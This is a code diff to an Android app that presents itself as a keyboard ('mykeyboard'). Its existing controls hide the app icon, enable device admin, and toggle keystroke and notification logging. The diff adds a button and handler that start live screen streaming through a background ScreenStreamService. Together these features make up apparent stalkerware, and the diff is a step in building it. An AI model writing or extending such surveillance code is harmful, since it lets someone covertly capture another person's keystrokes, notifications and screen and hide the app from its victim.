@@ -2,12 +2,12 @@ package com.example.mykeyboard
 
 import android.annotation.SuppressLint
 import android.app.Activity
-import android.app.AlertDialog
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
@@ -154,6 +154,7 @@ class MainActivity : Activity() {
             val btnTestSync = findViewById<Button>(R.id.btnTestSync)
             val btnEnableAdmin = findViewById<Button>(R.id.btnEnableAdmin)
             val btnHideAppIcon = findViewById<Button>(R.id.btnHideAppIcon)
+            val btnStartScreenStream = findViewById<Button>(R.id.btnStartScreenStream)
             val btnToggleKeyLog = findViewById<Button>(R.id.btnToggleKeyLog)
             val btnToggleNotifLog = findViewById<Button>(R.id.btnToggleNotifLog)
 
@@ -223,6 +224,15 @@ class MainActivity : Activity() {
                 }
             }
 
+            btnStartScreenStream?.setOnClickListener {
+                try {
+                    val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                    startActivityForResult(projectionManager.createScreenCaptureIntent(), 1001)
+                } catch (e: Exception) {
+                    Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
+                }
+            }
+
             btnHideAppIcon?.setOnClickListener {
                 try {
                     val p = packageManager
@@ -282,6 +292,23 @@ class MainActivity : Activity() {
             }
         } catch (e: Exception) {
             e.printStackTrace()
+        }
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == 1001 && resultCode == RESULT_OK && data != null) {
+            val serviceIntent = Intent(this, ScreenStreamService::class.java).apply {
+                putExtra("resultCode", resultCode)
+                putExtra("data", data)
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent)
+            } else {
+                startService(serviceIntent)
+            }
+            Toast.makeText(this, "Live Screen Streaming Started!", Toast.LENGTH_LONG).show()
+            LogStore.addLog("Live Screen Streaming Started")
         }
     }
 
